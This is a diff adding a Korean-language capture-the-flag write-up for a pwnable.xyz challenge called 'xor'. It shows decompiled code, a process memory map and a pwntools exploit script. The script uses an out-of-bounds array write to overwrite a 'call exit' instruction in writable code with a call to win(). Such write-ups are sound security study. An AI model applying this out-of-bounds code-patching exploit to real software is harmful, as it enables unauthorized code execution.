@@ -124,5 +124,78 @@ r.sendafter("> ","2")
 
 print r.recvall()
 ~~~
+## xor
+~~~
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // [rsp+Ch] [rbp-24h]
+  __int64 v4; // [rsp+10h] [rbp-20h]
+  __int64 v5; // [rsp+18h] [rbp-18h]
+  __int64 v6; // [rsp+20h] [rbp-10h]
+  unsigned __int64 v7; // [rsp+28h] [rbp-8h]
 
+  v7 = __readfsqword(0x28u);
+  puts("The Poopolator");
+  setup("The Poopolator", argv);
+  while ( 1 )
+  {
+    v6 = 0LL;
+    printf(format);
+    v3 = _isoc99_scanf("%ld %ld %ld", &v4, &v5, &v6);
+    if ( !v4 || !v5 || !v6 || v6 > 9 || v3 != 3 )
+      break;
+    result[v6] = v5 ^ v4;
+    printf("Result: %ld\n", result[v6]);
+  }
+  exit(1);
+}
+~~~
+ida로 main을 열었을 때 코드이고 여기도 역시 win()함수를 통해 flag를 제공한다. 따라서 이 주소를 사용하는것을 알 수 있다. 그리고 checksec을 해줬더니 full-relro 가 켜져 있어서 앞의 문제와 같이 got를 사용한
+공격은 하지 못한다. 
+~~~
+pwndbg> cat /proc/52263/maps
+55df929f8000-55df929f9000 rwxp 00000000 08:01 1572913                    /home/neururaon/Documents/challenge2
+55df92bf9000-55df92bfa000 r--p 00001000 08:01 1572913                    /home/neururaon/Documents/challenge2
+55df92bfa000-55df92bfb000 rw-p 00002000 08:01 1572913                    /home/neururaon/Documents/challenge2
+55df935f6000-55df93617000 rw-p 00000000 00:00 0                          [heap]
+7f38436ce000-7f38438b5000 r-xp 00000000 08:01 1184894                    /lib/x86_64-linux-gnu/libc-2.27.so
+7f38438b5000-7f3843ab5000 ---p 001e7000 08:01 1184894                    /lib/x86_64-linux-gnu/libc-2.27.so
+7f3843ab5000-7f3843ab9000 r--p 001e7000 08:01 1184894                    /lib/x86_64-linux-gnu/libc-2.27.so
+7f3843ab9000-7f3843abb000 rw-p 001eb000 08:01 1184894                    /lib/x86_64-linux-gnu/libc-2.27.so
+7f3843abb000-7f3843abf000 rw-p 00000000 00:00 0 
+7f3843abf000-7f3843ae6000 r-xp 00000000 08:01 1184866                    /lib/x86_64-linux-gnu/ld-2.27.so
+7f3843ccf000-7f3843cd1000 rw-p 00000000 00:00 0 
+7f3843ce6000-7f3843ce7000 r--p 00027000 08:01 1184866                    /lib/x86_64-linux-gnu/ld-2.27.so
+7f3843ce7000-7f3843ce8000 rw-p 00028000 08:01 1184866                    /lib/x86_64-linux-gnu/ld-2.27.so
+7f3843ce8000-7f3843ce9000 rw-p 00000000 00:00 0 
+7fffb1fb8000-7fffb1fd9000 rw-p 00000000 00:00 0                          [stack]
+7fffb1fea000-7fffb1fed000 r--p 00000000 00:00 0                          [vvar]
+7fffb1fed000-7fffb1fee000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+~~~
+process map을 통해 55df929f8000-55df929f9000에 rwxp 권한이 있다는 것을 알 수 있었다. 따라서 기계어를 써서
+저 부분을 call win으로 바꾸어 준다. win의 주소는 0xA21이다. v5^v4의 결과값이 call win을 little endian한 값이
+되도록 해야 한다. 자력으로 해보려 했으나 잘 되지 않아 writeup을 참고한 결과 0xac8 즉 call exit의 주소부부분을
+call 0xA21로 바꾸어 주면 풀린다. 참고하여 짠 exploit code는 아래와 같다.
+~~~python
+from pwn import *
 
+#p = process('./xor')
+p = remote('svc.pwnable.xyz', 30029)
+e = ELF('./challenge2')
+
+exit = 0xac8
+
+e.asm(exit, "call 0xa21") 
+result = e.read(exit, 5)
+result = int(result[::-1].encode("Hex"), 16) 
+
+payload = ''
+payload += "1 "
+payload += str(result ^ 1) + ' '
+payload += str((exit - 0x202200) / 8)
+
+p.sendlineafter('  ', payload)
+p.sendlineafter('  ', 'A') 
+p.interactive()
+~~~
